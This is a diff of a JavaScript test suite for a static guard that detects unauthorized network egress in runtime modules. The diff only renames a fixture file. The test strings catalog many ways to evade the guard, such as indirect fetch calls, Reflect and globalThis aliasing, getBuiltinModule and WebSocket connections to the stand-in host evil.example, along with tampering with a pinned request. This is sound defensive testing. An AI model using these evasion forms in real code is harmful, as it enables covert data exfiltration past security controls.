@@ -245,7 +245,7 @@ describe('ADR-0035 §4 guard — gates catch real violations', () => {
 
 describe('ADR-0035 §4 guard — look-alikes stay quiet', () => {
   it('Map.get / byDate.get is not a network call', () => {
-    deepStrictEqual(scan('cutover-audit.mjs', `const v = byDate.get(date); const w = map.get(key);`), []);
+    deepStrictEqual(scan('consensus.mjs', `const v = byDate.get(date); const w = map.get(key);`), []);
   });
   it('prose mentioning remove/--sandbox/login is not argv', () => {
     const src = `const msg = 'remove it with codex plugin remove'; const f = /--sandbox\\b/.test(t);`;
@@ -255,7 +255,7 @@ describe('ADR-0035 §4 guard — look-alikes stay quiet', () => {
     deepStrictEqual(scan('doctor.mjs', `const x = { plugin_remove_command: true, sandbox_flag: false };`), []);
   });
   it('namespace .get on a non-network module (cache.get) is not an exec/network call', () => {
-    deepStrictEqual(scan('cutover-audit.mjs', `import * as cache from './cache.mjs'; const v = cache.get(key);`), []);
+    deepStrictEqual(scan('consensus.mjs', `import * as cache from './cache.mjs'; const v = cache.get(key);`), []);
   });
 });
 
@@ -455,7 +455,7 @@ describe('ADR-0035 §4 guard — ADR-0040 notification dispatch (per-source nega
   });
 
   it('the same fixed template in a NON-importer runtime file → import-gate', () => {
-    ok(rules(scan('cutover-audit.mjs', `${PRELUDE}doSpawn('/usr/bin/osascript', ${FIXED_ARGV}, ${OPTS});`)).includes('import-gate'));
+    ok(rules(scan('consensus.mjs', `${PRELUDE}doSpawn('/usr/bin/osascript', ${FIXED_ARGV}, ${OPTS});`)).includes('import-gate'));
   });
 
   it('a bare `osascript` (PATH-resolved, not the pinned absolute path) → command-gate', () => {
@@ -489,7 +489,7 @@ describe('ADR-0041 §2d guard — global fetch egress (per-source negative confo
   });
 
   it('global fetch in a NON-registered runtime file → global-fetch-gate', () => {
-    ok(rules(scan('cutover-audit.mjs', `${PINNED};`)).includes('global-fetch-gate'));
+    ok(rules(scan('consensus.mjs', `${PINNED};`)).includes('global-fetch-gate'));
   });
 
   it('globalThis.fetch in a capability-importer file (not fetch-registered) → global-fetch-gate', () => {
@@ -531,22 +531,22 @@ describe('ADR-0041 §2d guard — global fetch egress (per-source negative confo
   // Codex-review CRITICAL bypasses — the fail-closed redesign must now catch
   // every indirection form and every validation dodge.
   it('optional-chaining call fetch?.() in a non-registered file → global-fetch-gate', () => {
-    ok(rules(scan('cutover-audit.mjs', "fetch?.('https://evil.example/x', opts);")).includes('global-fetch-gate'));
+    ok(rules(scan('consensus.mjs', "fetch?.('https://evil.example/x', opts);")).includes('global-fetch-gate'));
   });
   it("computed access globalThis['fetch']() → global-fetch-gate", () => {
-    ok(rules(scan('cutover-audit.mjs', "globalThis['fetch']('https://evil.example/x', opts);")).includes('global-fetch-gate'));
+    ok(rules(scan('consensus.mjs', "globalThis['fetch']('https://evil.example/x', opts);")).includes('global-fetch-gate'));
   });
   it("Reflect.get(globalThis,'fetch')() → global-fetch-gate", () => {
-    ok(rules(scan('cutover-audit.mjs', "Reflect.get(globalThis, 'fetch')('https://evil.example/x', opts);")).includes('global-fetch-gate'));
+    ok(rules(scan('consensus.mjs', "Reflect.get(globalThis, 'fetch')('https://evil.example/x', opts);")).includes('global-fetch-gate'));
   });
   it('fetch.call/.apply → global-fetch-gate', () => {
-    ok(rules(scan('cutover-audit.mjs', "fetch.call(globalThis, 'https://evil.example/x', opts);")).includes('global-fetch-gate'));
+    ok(rules(scan('consensus.mjs', "fetch.call(globalThis, 'https://evil.example/x', opts);")).includes('global-fetch-gate'));
   });
   it('a globalThis alias then member call (const g = globalThis; g.fetch()) → global-fetch-gate', () => {
-    ok(rules(scan('cutover-audit.mjs', "const g = globalThis; g.fetch('https://evil.example/x', opts);")).includes('global-fetch-gate'));
+    ok(rules(scan('consensus.mjs', "const g = globalThis; g.fetch('https://evil.example/x', opts);")).includes('global-fetch-gate'));
   });
   it('a tagged-template fetch`...` → global-fetch-gate', () => {
-    ok(rules(scan('cutover-audit.mjs', 'fetch`https://evil.example/x`;')).includes('global-fetch-gate'));
+    ok(rules(scan('consensus.mjs', 'fetch`https://evil.example/x`;')).includes('global-fetch-gate'));
   });
   it('URL via && / concatenation defeating the pinned literal → global-fetch-gate', () => {
     ok(rules(scan('notify.mjs', "fetch('https://api.telegram.org/bot' && 'https://evil.example/x', { method: 'POST', redirect: 'error', signal: AbortSignal.timeout(5) });")).includes('global-fetch-gate'));
@@ -572,10 +572,10 @@ describe('ADR-0041 §2d guard — global fetch egress (per-source negative confo
     ok(rules(scan('notify.mjs', src)).includes('global-fetch-gate'));
   });
   it("Reflect['get'](globalThis,'fetch') → global-fetch-gate", () => {
-    ok(rules(scan('cutover-audit.mjs', "Reflect['get'](globalThis, 'fetch')('https://evil.example/x', {});")).includes('global-fetch-gate'));
+    ok(rules(scan('consensus.mjs', "Reflect['get'](globalThis, 'fetch')('https://evil.example/x', {});")).includes('global-fetch-gate'));
   });
   it('Object.getOwnPropertyDescriptor(globalThis, "fetch").value → global-fetch-gate', () => {
-    ok(rules(scan('cutover-audit.mjs', "Object.getOwnPropertyDescriptor(globalThis, 'fetch').value('https://evil.example/x', {});")).includes('global-fetch-gate'));
+    ok(rules(scan('consensus.mjs', "Object.getOwnPropertyDescriptor(globalThis, 'fetch').value('https://evil.example/x', {});")).includes('global-fetch-gate'));
   });
   it('a spread that overrides the pinned init → global-fetch-gate', () => {
     ok(rules(scan('notify.mjs', "fetch('https://api.telegram.org/bot0/sendMessage', { method: 'POST', redirect: 'error', signal: AbortSignal.timeout(5), ...evil });")).includes('global-fetch-gate'));
@@ -597,7 +597,7 @@ describe('ADR-0041 §2d guard — global fetch egress (per-source negative confo
 
   // Fail-CLOSED must not over-reject the legitimate forms.
   it('a fetch-mentioning string in a non-registered file is NOT flagged (no over-reject)', () => {
-    deepStrictEqual(scan('cutover-audit.mjs', 'const help = "fetch(url, init)";'), []);
+    deepStrictEqual(scan('consensus.mjs', 'const help = "fetch(url, init)";'), []);
   });
   it("the former full pinned fetch call in notify.mjs is now rejected (transport swapped to node:https) → global-fetch-gate", () => {
     const src = "const token = 't'; const payload = {}; "
@@ -607,10 +607,10 @@ describe('ADR-0041 §2d guard — global fetch egress (per-source negative confo
 
   // Codex round-3 — the round-2 fixes' own residual holes.
   it('a fetch inside a template ${...} interpolation (executable code) → global-fetch-gate', () => {
-    ok(rules(scan('cutover-audit.mjs', "const leak = `${await fetch('https://evil.example/x', { method: 'GET' })}`;")).includes('global-fetch-gate'));
+    ok(rules(scan('consensus.mjs', "const leak = `${await fetch('https://evil.example/x', { method: 'GET' })}`;")).includes('global-fetch-gate'));
   });
   it('a padded Reflect.get(globalThis, <spaces> "fetch") → global-fetch-gate', () => {
-    ok(rules(scan('cutover-audit.mjs', "Reflect.get(globalThis,                              'fetch')('https://evil.example/x', {});")).includes('global-fetch-gate'));
+    ok(rules(scan('consensus.mjs', "Reflect.get(globalThis,                              'fetch')('https://evil.example/x', {});")).includes('global-fetch-gate'));
   });
   it('a getter property overriding a pinned key at runtime → global-fetch-gate', () => {
     ok(rules(scan('notify.mjs', "fetch('https://api.telegram.org/bot0/sendMessage', { method: 'POST', redirect: 'error', signal: AbortSignal.timeout(5), get redirect() { return 'follow'; } });")).includes('global-fetch-gate'));
@@ -655,7 +655,7 @@ describe('ADR-0041 §2d guard — pinned node:https egress (per-source negative 
 
   // --- ADR-0041 §2d fail-closed matrix ---------------------------------------
   it('non-notify egress: the pinned request in another runtime file → import-gate', () => {
-    ok(rules(scan('cutover-audit.mjs', PINNED)).includes('import-gate'));
+    ok(rules(scan('consensus.mjs', PINNED)).includes('import-gate'));
   });
 
   it('a non-POST method → pinned-https-gate', () => {
@@ -755,7 +755,7 @@ describe('ADR-0041 §2d guard — pinned node:https egress (per-source negative 
 
   // --- Fail-CLOSED must not over-reject the legitimate forms -----------------
   it('a node:https-mentioning string in a non-registered file is NOT flagged (no over-reject)', () => {
-    deepStrictEqual(scan('cutover-audit.mjs', 'const help = "https.request(url, options)";'), []);
+    deepStrictEqual(scan('consensus.mjs', 'const help = "https.request(url, options)";'), []);
   });
 
   it('the pinned tokens buried in a nested string, real request is GET → pinned-https-gate', () => {
@@ -915,7 +915,7 @@ describe('ADR-0041 §2d guard — pinned node:https egress (per-source negative 
     ok(rules(scan('notify.mjs', "const { getBuiltinModule } = process; const h = getBuiltinModule('node:https'); h.request('https://evil.example/x', {});")).includes('import-gate'));
   });
   it('a mere string mention of getBuiltinModule is NOT flagged (no over-reject)', () => {
-    deepStrictEqual(scan('cutover-audit.mjs', 'const doc = "avoid process.getBuiltinModule here";'), []);
+    deepStrictEqual(scan('consensus.mjs', 'const doc = "avoid process.getBuiltinModule here";'), []);
   });
 
   // MINOR: an explicit object KEY named like the binding ({ https: true }) is not a value
@@ -985,10 +985,10 @@ describe('ADR-0041 §2d guard — pinned node:https egress (per-source negative 
     ok(rules(scan('notify.mjs', "const ws = new WebSocket('wss://evil.example/x'); ws.send('x');")).includes('global-websocket-gate'));
   });
   it('WebSocket in ANY runtime file (not just the egress file) → global-websocket-gate', () => {
-    ok(rules(scan('cutover-audit.mjs', "const ws = new WebSocket('wss://evil.example/x');")).includes('global-websocket-gate'));
+    ok(rules(scan('consensus.mjs', "const ws = new WebSocket('wss://evil.example/x');")).includes('global-websocket-gate'));
   });
   it('a mere string mention of WebSocket is NOT flagged', () => {
-    deepStrictEqual(scan('cutover-audit.mjs', 'const doc = "do not open a WebSocket";'), []);
+    deepStrictEqual(scan('consensus.mjs', 'const doc = "do not open a WebSocket";'), []);
   });
 
   // Regression: a pinned request alongside a legit \u-bearing scrub regex (as in the real
